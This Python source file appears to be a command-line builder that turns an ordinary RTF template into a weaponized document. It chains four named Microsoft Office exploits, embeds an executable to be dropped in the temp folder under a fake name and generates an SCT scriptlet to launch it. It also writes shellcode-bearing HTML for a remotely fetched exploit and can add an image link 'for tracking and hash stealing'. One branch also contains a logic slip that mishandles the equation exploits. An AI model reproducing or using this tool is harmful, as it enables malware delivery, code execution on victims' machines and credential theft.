#!/usr/bin/env python3

import sys
import os
import argparse
import subprocess
import re
import shutil
import base64
import time
import binascii
import random
import string
import itertools
import struct
import tempfile
import urllib

import utils
from utils import debug, ok, yes, no, bye

import rtf_package
import exploits.king
import exploits.equation
import exploits.composite

# defaults
default_king_shellcode = 'resources/rtf_winexec.bin'
default_king_exe_name = 'ms.exe'
default_rtf = 'resources/blank.rtf'
default_fakepath = R'C:\Drivers'
default_exploits = ['equation1', 'equation2', 'composite']

# order that the exploits should be executed in. this matters because some
# exploits will crash office before the others can execute (especially king)
supported_exploits = [
    'equation1',
    'equation2',
    'composite',
    'king',
]

# name: cve
exploit_to_cve = {
    'equation1': 'cve-2017-11882',
    'equation2': 'cve-2018-0802',
    'composite': 'cve-2017-8570',
    'king':      'cve-2018-8174',
}

# inverse dictionary for lookups
cve_to_exploit = {
    v: k for k, v in exploit_to_cve.items()
}

# make sure we have a package we can execute
def check_packages(packages, exe_name):
    if not packages:
        return False

    if exe_name:
        for _, fakename in packages:
            if fakename == exe_name:
                return True
    else:
        return len(packages) == 1

    return False

# parse packages. e.g. '/path/filename.exe:fakename.exe' to ('/path/filename.exe', 'fakename.exe')
# or /path/filename.exe to ('/path/filename.exe', 'filename.exe')
def parse_packages(packages):
    ret = []
    for package in packages:
        if ':' in package:
            # use fake filename
            package, fake, *_ = package.split(':')
            ret.append((package, fake))
        else:
            # use real filename
            ret.append((package, os.path.basename(package)))
    return ret

# generate included image for image tracing
def generate_image(url):
    return R'{\field{\*\fldinst{INCLUDEPICTURE "' + url + R'" MERGEFORMAT \\d \\w0001 \\h0001 \\pm1 \\px0 \\py0 \\pw0}}}'

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-D', '--debug', action='store_true', help='enable debug')
    parser.add_argument('-l', '--list', action='store_true', help='list exploits and additions')

    parser.add_argument('-u', '--use', action='append', help='add exploit (see --list)')
    parser.add_argument('--use-cve', action='append', help='add exploit (by CVE)')
    parser.add_argument('--exe-name',
            help='name for dropped EXE file (for exploits equation and composite)')
    parser.add_argument('--template', default=utils.basedir(default_rtf),
            help='RTF template to add exploit to (default: {})'.format(default_rtf))
    parser.add_argument('--fake-path', default=default_fakepath,
            help='fake path for packaged files (default: {})'.format(default_fakepath))
    parser.add_argument('-o', '--out', help='RTF output')

    king = parser.add_argument_group('king exploit', 'King exploit (CVE-2018-8174) options')
    king.add_argument('--king-shellcode', default=utils.basedir(default_king_shellcode),
            help='shellcode for CVE-2018-8174 (default: {})'.format(default_king_shellcode))
    king.add_argument('--king-url', help='URL where HTML will be hosted for king exploit (max: 39 chars)')
    king.add_argument('--king-html-out', help='output file for king HTML')

    composite = parser.add_argument_group('composite exploit', 'Composite moniker exploit (CVE-2017-8570) options')
    composite.add_argument('--composite-sct', help='use this SCT file instead of generating one')

    additions = parser.add_argument_group('additions', 'Additional things to add to the RTF')
    additions.add_argument('--image-track', help='include an image from this URL, for tracking and hash stealing')
    additions.add_argument('-p', '--package', action='append',
            help='files to add as packages. will by dropped in temp (append fake name with colon)')
    args = parser.parse_args()

    # -D/--debug
    utils.enable_debug = args.debug

    # -l/--list
    if args.list:
        print('exploits (use with --use):')
        for exploit, cve in exploit_to_cve.items():
            print(' - {} ({})'.format(exploit, cve))
        print()
        print('additions:')
        print(' - image tracking and hash stealing (use with --image-track)')
        print(' - embed file as package to be dropped in %temp% (use with --package)')
        sys.exit()

    # read original rtf
    with open(args.template, 'r') as fp:
        rtf = fp.read()

    # remove last }
    rtf = rtf.rstrip()
    if rtf[-1] != '}':
        bye('} must be the last character of the rtf')
    rtf = rtf[:-1]

    rtf += '\n' * 3

    # use these exploits
    used = []
    if args.use:
        # -u/--use
        for item in args.use:
            for exploit in item.split(','):
                exploit = exploit.lower()

                if exploit == 'all':
                    # use all exploits
                    used += supported_exploits
                else:
                    # check to make sure it exists
                    if exploit not in supported_exploits:
                        bye('unknown exploit: {}'.format(exploit))
                    used.append(exploit)
    else:
        # defaults
        used = default_exploits

    # --use-cve
    if args.use_cve:
        for item in args.use_cve:
            for cve in item.split(','):
                cve = cve.lower()
                # check to make sure it exists
                if cve not in cve_to_exploit:
                    bye('unknown CVE: {}'.format(cve))
                used.append(cve_to_exploit[cve])

    # sort the exploits by reliability
    used = list(set(used))
    used = sorted(used, key=lambda x: supported_exploits.index(x))

    # embed packages
    packages = None
    if args.package:
        packages = parse_packages(args.package)
        for package, fakename in packages:
            package = rtf_package.Package(package, fakename=fakename,
                    fakepath=args.fake_path)
            rtf += package.build_package()

    # track with image (--image-track)
    if args.image_track:
        yes('adding image track: {}'.format(args.image_track))
        rtf += generate_image(args.image_track)

    # generate exploits
    for exploit in used:
        yes('adding exploit {} ({})'.format(exploit, exploit_to_cve[exploit]))
        if exploit == 'king':
            # check args
            if not args.king_url:
                bye('specify --king-url')
            if not args.king_html_out:
                bye('specify --king-html-out')

            # if using the default shellcode, make sure it'll work
            if args.king_shellcode == utils.basedir(default_king_shellcode):
                if (args.exe_name and args.exe_name != default_king_exe_name) or \
                    not check_packages(packages, default_king_exe_name):
                    bye('the default king shellcode expects an executable named {} to be packaged'.format(default_king_exe_name))

            # make rtf part
            rtf_part = exploits.king.generate_rtf(args.king_url)
            if not rtf_part:
                bye('king url too long: {}'.format(args.king_url))
            rtf += rtf_part

            # read shellcode
            with open(args.king_shellcode, 'rb') as fp:
                shellcode = fp.read()

            # make html part
            html = exploits.king.generate_html(shellcode)

            # output html
            ok('writing king html to {}'.format(args.king_html_out))
            ok('rtf will retrive king exploit from {}'.format(args.king_url))
            with open(args.king_html_out, 'w+') as fp:
                fp.write(html)
        elif exploit in ['equation1', 'equation2']:
            if not check_packages(packages, args.exe_name):
                bye('provide a file to execute with -p/--package (or change file with --exe-name)'.format(args.exe_name))

            # exe name is --exe-name or the package if there's only one
            exe_name = args.exe_name if args.exe_name else packages[0][1]

            if exploit == 'equation2':
                rtf += exploits.equation.generate_rtf1(exe_name)
            elif exploit == 'equation2':
                rtf += exploits.equation.generate_rtf2(exe_name)
        elif exploit == 'composite':
            if not check_packages(packages, args.exe_name):
                bye('provide a file to execute with -p/--package (or change file with --exe-name)'.format(args.exe_name))

            # exe name is --exe-name or the package if there's only one
            exe_name = args.exe_name if args.exe_name else packages[0][1]

            # add SCT if needed
            with tempfile.NamedTemporaryFile() as temp:
                sct_name = utils.randstr(15, 15) + '.sct'
                if args.composite_sct:
                    # use user SCT
                    package = rtf_package.Package(args.composite_sct,
                            fakename=sct_name,
                            fakepath=args.fake_path)
                    rtf += package.build_package()
                else:
                    # build an SCT
                    sct = exploits.composite.generate_sct(exe_name)
                    temp.write(sct.encode())
                    temp.flush()

                    package = rtf_package.Package(temp.name,
                            fakename=sct_name,
                            fakepath=args.fake_path)
                    rtf += package.build_package()

            rtf += exploits.composite.generate_rtf(sct_name)
        else:
            raise RuntimeError('unknown exploit')

    # add back an enclosing }
    rtf += '}\n'

    # write new rtf
    if args.out:
        ok('writing rtf to {}'.format(args.out))
        with open(args.out, 'w+') as fp:
            fp.write(rtf)
    else:
        bye('specify output RTF file with --out')

if __name__ == '__main__':
    main()
